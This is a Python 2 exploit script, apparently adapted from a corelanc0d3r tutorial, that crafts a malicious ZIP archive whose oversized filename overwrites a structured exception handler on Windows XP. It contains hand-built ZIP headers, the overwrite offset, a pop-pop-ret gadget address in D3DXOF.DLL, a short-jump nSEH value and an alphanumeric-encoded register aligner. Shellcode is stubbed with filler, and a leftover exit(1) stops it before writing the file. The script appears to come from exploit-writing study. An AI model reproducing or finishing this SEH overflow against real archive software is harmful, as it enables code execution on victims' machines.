#!/usr/bin/env python
# Original Author : corelanc0d3r
# Pocython Author: d3cc3pt10n
# Note: Python 3 doesn't work, Python 2 does...weird!

from struct import pack

filename = 'pycorelanboom.zip'
filesize = '\xe4\x0f'

# Local file header
# 30 bytes
ldf_header = (
        "\x50\x4B\x03\x04"
        "\x14\x00\x00\x00"
        "\x00\x00\xB7\xAC"
        "\xCE\x34\x00\x00"
        "\x00\x00\x00\x00"
        "\x00\x00\x00\x00"
        "\x00"
        + filesize +          # file size 4068
        "\x00"
        "\x00\x00")

# Central directory header
# 46 bytes
cdf_header = (
    "\x50\x4B\x01\x02"
    "\x14\x00\x14\x00"
    "\x00\x00\x00\x00"
    "\xB7\xAC\xCE\x34"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    + filesize +
    "\x00\x00\x00\x00"
    "\x00\x00\x01\x00"
    "\x24\x00\x00\x00"
    "\x00\x00\x00\x00")

# End of file central directory header
# 22 bytes
eofcdf_header = (
    "\x50\x4B\x05\x06"
    "\x00\x00\x00\x00"
    "\x01\x00\x01\x00"
    "\x12\x10\x00\x00" # Size of central directory (bytes)
    "\x02\x10\x00\x00" # Offset of start of central directory,
                       # relative to start of archive
    "\x00\x00")

# payload_length = 4064 pattern + 4 .txt extension = 4068
#[+] Examining SEH chain
#    SEH record (nseh field) at 0x0012fbfc overwritten with normal pattern : 0x41396a41 (offset 297), followed by 1020 bytes of cyclic data after the handler
# Message=  0x6d7e512a : pop edi # pop esi # ret 0x04 | asciiprint,ascii {PAGE_EXECUTE_READ} [D3DXOF.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v5.1.2600.0 (C:\WINXP\system32\D3DXOF.DLL)


# 6 or 4 byte jump net (JNO SHORT / JO SHORT)
nseh = '\x71\x06\x70\x04'
# EIP
# < means little-endian
# L means unsigned long - 4 bytes
seh = pack('<L', 0x6d7e512a)
          
aligner = (
        '\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A' # zero out EAX
        '\x2D\x0D\x01\x4F\x55\x2D\x0D\x01\x4F\x55\x2D\x0E\x03\x4F\x55\x50' # calculate the start of our shellcode, and push it on the stack
        '\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A' # zero out EAX
        '\x2D\x4A\x55\x30\x30\x2D\x4A\x55\x30\x30\x2D\x4C\x55\x30\x30\x50' # calculate JMP 
)
print(len(aligner))
exit(1)
payload = ('A' * 297) + nseh + seh + aligner + ('D'*(4068 - 8 - 297 - len(aligner)))
payload_length = len(payload)

if payload_length != 4068:
    print("[!] Warning, payload size isn't correct!")

exploit = ldf_header + payload + cdf_header + payload + eofcdf_header

print("Size : {s}n".format(s=payload_length))
with open(filename, 'w') as f:
    f.write(exploit)
